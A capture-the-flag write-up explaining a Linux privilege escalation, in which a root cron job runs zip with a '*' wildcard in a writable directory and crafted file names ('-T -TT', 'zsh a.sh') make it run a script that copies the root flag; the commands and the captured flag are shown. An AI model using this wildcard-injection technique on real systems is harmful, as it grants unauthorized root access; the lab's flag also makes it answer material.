## Neural Network 5
Now in the previous challenge when we looked at the cronjobs you might have noticed another cronjob named `backup`.

```bash
dalle@21f1622aa404:~$ ls /etc/cron.d
backup  e2scrub_all  train
dalle@21f1622aa404:~$ cat /etc/cron.d/backup 
SHELL=/bin/bash

* * * * * root (cp /root/personal/* /tmp/backup && cd /tmp/backup && zip --symlinks backup.zip * && mv backup.zip ..; rm /tmp/backup/*)
# Don't remove the empty line at the end of this file. It is required to run the cron job
```

Now, it is not immediately obvious what has to be done. But if you are familiar with wildcard injection you might understand how we can exploit this.

You can see that root is running `zip --symlinks backup.zip *` within the `/tmp/backup` which we have write access to. Having a star wildcard in the command 
within a publically writable directory can be quite dangerous as we can name files as argument flags and the files will be interpreted as arguments to the
command instead of files.

This attack path is well documented and we can look into [gtfobins](https://gtfobins.github.io/gtfobins/zip/) in hopes of a documented way of exploiting `zip`.
We do find an exploit to get a shell and that is using the `-T -TT` flags.

So we will go ahead and create those files within `/tmp/backup` with our exploit and wait to get the flag.

```bash
dalle@21f1622aa404:~$ cd /tmp
dalle@21f1622aa404:/tmp$ echo "cat /root/flag.txt > /tmp/flag.txt" > backup/a.sh
dalle@21f1622aa404:/tmp$ cd backup
dalle@21f1622aa404:/tmp/backup$ touch -- -T -TT "zsh a.sh"
dalle@21f1622aa404:/tmp/backup$ cat ../flag.txt
gg{r007_f0r_7h3_und3rd0g}
```
